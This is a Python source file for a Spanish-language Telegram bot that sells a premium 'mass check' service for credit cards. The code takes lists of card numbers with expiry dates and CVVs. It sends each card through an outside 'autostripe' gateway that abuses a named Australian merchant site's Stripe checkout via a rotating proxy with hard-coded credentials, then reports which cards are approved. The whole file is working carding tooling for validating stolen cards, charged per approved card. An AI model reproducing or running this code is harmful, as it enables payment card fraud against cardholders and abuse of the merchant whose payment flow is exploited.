# commands/mass_check.py
import sys
import os
import time
import requests
import json
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.database import get_credits, set_credits, get_plan, is_premium
from utils.bin_database import get_bin_info

def setup_mass_check_command(bot):
    @bot.message_handler(commands=['ms'])
    def mass_check_command(message):
        print(f"🔹 Comando /ms recibido de {message.from_user.first_name}")
        process_mass_check(bot, message)
    
    @bot.message_handler(func=lambda message: message.text and message.text.startswith('.ms '))
    def mass_check_command_dot(message):
        print(f"🔹 Comando .ms recibido de {message.from_user.first_name}")
        process_mass_check(bot, message)

def process_mass_check(bot, message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    # Verificar si es Premium User
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Comando solo para usuarios premium.\n@Dunxito para adquirir tu plan.")
        return
    
    # Verificar créditos
    credits = get_credits(user_id)
    if credits <= 0:
        bot.reply_to(message, "❌ Créditos insuficientes.")
        return
    
    try:
        # Obtener el texto después del comando
        if message.text.startswith('/ms'):
            command_text = message.text[4:]
        elif message.text.startswith('.ms '):
            command_text = message.text[4:]
        else:
            command_text = message.text.strip()
            
        print(f"🔹 Texto del comando: '{command_text}'")
        
        if not command_text:
            bot.reply_to(message, "⚠️ Uso: `/ms <lista_de_tarjetas>`\nEjemplo: `/ms 4282104033002891|11|29|500 5104886655308541|09|29|094`\nMínimo: 2 tarjetas\nMáximo: 25 tarjetas\nCosto: 2 créditos por tarjeta APPROVED", parse_mode="Markdown")
            return
        
        # Dividir las tarjetas (separadas por espacios)
        cards = command_text.split()
        print(f"🔹 Tarjetas encontradas: {len(cards)}")
        
        # Validar mínimo 2 tarjetas
        if len(cards) < 2:
            bot.reply_to(message, "❌ Se necesitan 2 tarjetas como minimo.", parse_mode="Markdown")
            return
        
        # Limitar a 25 tarjetas máximo
        if len(cards) > 25:
            cards = cards[:25]
            bot.reply_to(message, f"⚠️ Se procesarán solo las primeras 25 tarjetas de las {len(cards)} enviadas")
        
        # Calcular créditos máximos que podría gastar (2 créditos por tarjeta)
        max_possible_cost = len(cards) * 2
        print(f"🔹 Costo máximo posible: {max_possible_cost} créditos")
        
        # Verificar si tiene créditos suficientes para el peor caso
        if credits < max_possible_cost:
            bot.reply_to(message, f"❌ Créditos insuficientes. Necesitas al menos {max_possible_cost} créditos para procesar {len(cards)} tarjetas (2 créditos por cada APPROVED)")
            return
        
        # Enviar mensaje de procesamiento
        print("🔹 Enviando mensaje de procesamiento...")
        processing_msg = bot.reply_to(message, f"🔄 Procesando {len(cards)} tarjetas...\n⏳ Esto puede tomar unos segundos...\n💳 Créditos disponibles: {credits}")
        
        # Procesar todas las tarjetas
        start_time = time.time()
        results = []
        approved_cards = 0
        total_cost = 0
        
        for i, card_data in enumerate(cards, 1):
            try:
                print(f"🔹 Procesando tarjeta {i}: {card_data[:10]}...")
                
                # Procesar cada tarjeta individualmente
                result, is_approved = process_single_card(card_data, i)
                results.append(result)
                
                # Contar tarjetas aprobadas y calcular costo
                if is_approved:
                    approved_cards += 1
                    total_cost += 2
                    print(f"🔹 Tarjeta {i} APPROVED - Costo acumulado: {total_cost}")
                
                # Actualizar mensaje de progreso cada 3 tarjetas
                if i % 3 == 0 or i == len(cards):
                    progress_msg = f"🔄 Procesando {len(cards)} tarjetas...\n📊 Completado: {i}/{len(cards)}\n✅ Aprobadas: {approved_cards}\n💳 Costo acumulado: {total_cost} créditos"
                    bot.edit_message_text(progress_msg, message.chat.id, processing_msg.message_id)
                
            except Exception as e:
                error_msg = f"❌ Tarjeta {i}: Error - {str(e)}"
                results.append(error_msg)
                print(f"🔴 {error_msg}")
        
        # Restar créditos solo por las tarjetas APPROVED
        if total_cost > 0:
            new_credits = credits - total_cost
            set_credits(user_id, new_credits)
            print(f"🔹 Créditos restados: {total_cost}. Nuevo saldo: {new_credits}")
        else:
            new_credits = credits
            print("🔹 No se restaron créditos (ninguna tarjeta APPROVED)")
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        
        # Obtener plan del usuario actualizado
        plan = get_plan(user_id, new_credits)
        
        # Eliminar mensaje de procesamiento
        bot.delete_message(message.chat.id, processing_msg.message_id)
        
        # Formatear resultados
        results_text = "\n".join(results)
        
        # Crear respuesta final
        response_text = f"""
- - - - - - - - - - - - - - - - - - - - -
 Mass Check
- - - - - - - - - - - - - - - - - - - - - 
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Stripe Auth
- - - - - - - - - - - - - - - - - - - - - 

{results_text}

- - - - - - - - - - - - - - - - - - - - -
🝮 Total : {len(cards)} tarjetas
🝮 Approved : {approved_cards} tarjetas
🝮 Costo : {total_cost} créditos (2 por APPROVED)
🝮 Time : {total_time}s
🝮 Credits Left : {new_credits}
🝮 Checked by : {username} [{plan}]
"""
        
        print("🔹 Enviando respuesta final...")
        # Si el mensaje es muy largo, dividirlo en partes
        if len(response_text) > 4000:
            # Enviar primera parte
            first_part = response_text[:4000]
            bot.reply_to(message, first_part)
            
            # Enviar parte restante
            remaining_part = response_text[4000:]
            bot.reply_to(message, remaining_part)
        else:
            bot.reply_to(message, response_text)
        
        print("🔹 Mass check completado exitosamente")
        
    except Exception as e:
        print(f"🔴 ERROR en mass check: {str(e)}")
        # Eliminar mensaje de procesamiento si existe
        try:
            bot.delete_message(message.chat.id, processing_msg.message_id)
        except:
            pass
        bot.reply_to(message, f"❌ Error en mass check: {str(e)}")

def process_single_card(card_data, card_number):
    """Procesa una sola tarjeta y retorna el resultado formateado y si fue aprobada"""
    try:
        # Verificar formato de tarjeta
        if '|' not in card_data:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        cc_number, expiry_month, expiry_year, cvv = card_parts
        
        # Validar datos
        if not (cc_number.isdigit() and len(cc_number) == 16):
            return f"❌ Tarjeta {card_number}: Número inválido", False
            
        if not (expiry_month.isdigit() and 1 <= int(expiry_month) <= 12):
            return f"❌ Tarjeta {card_number}: Mes inválido", False
            
        # Validar y formatear año
        if not expiry_year.isdigit():
            return f"❌ Tarjeta {card_number}: Año inválido", False
            
        if len(expiry_year) == 1:
            formatted_year = "0" + expiry_year
        elif len(expiry_year) == 2:
            formatted_year = expiry_year
        elif len(expiry_year) == 4:
            formatted_year = expiry_year[2:]
        else:
            return f"❌ Tarjeta {card_number}: Año inválido", False
            
        if not (cvv.isdigit() and len(cvv) in [3, 4]):
            return f"❌ Tarjeta {card_number}: CVV inválido", False
        
        # Construir URL de Stripe
        stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy=p.webshare.io:80:bhiyynnu-rotate:hq37ts3k50kz"
        
        # Hacer la solicitud
        response = make_simple_request(stripe_url)
        
        # Procesar la respuesta
        result_message = extract_message_from_response(response)
        status = get_status_from_response(response)
        
        # Determinar si fue aprobada
        is_approved = status == "APPROVED ✅"
        
        # Obtener información del BIN
        bin_info = get_bin_info(cc_number[:6])
        
        # Formatear resultado individual - TARJETA COMPLETA
        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status} | {result_message[:30]}..."
        
        return result_text, is_approved
    
    except Exception as e:
        return f"❌ Tarjeta {card_number}: Error - {str(e)}", False

def make_simple_request(url):
    """Hace una solicitud simple con requests"""
    try:
        response = requests.get(url, timeout=30)
        return response.text
    except Exception as e:
        return f"Request Error: {str(e)}"

def extract_message_from_response(response):
    """Extrae el mensaje del JSON de respuesta"""
    try:
        data = json.loads(response)
        if "response" in data:
            return data["response"]
        elif "message" in data:
            return data["message"]
        else:
            return response[:50]
    except:
        return response[:50] if response else "NO RESPONSE"

def get_status_from_response(response):
    """Determina el estado basado en la respuesta"""
    try:
        data = json.loads(response)
        status = data.get("status", "").lower()
        
        if status == "approved":
            return "APPROVED ✅"
        elif status == "declined":
            return "DECLINED ❌"
        else:
            return "UNKNOWN 🔄"
            
    except:
        if not response:
            return "NO RESPONSE"
        elif "approved" in response.lower():
            return "APPROVED ✅"
        elif "declined" in response.lower():
            return "DECLINED ❌"
        elif "error" in response.lower():
            return "ERROR ⚠️"
        else:
            return "UNKNOWN 🔄"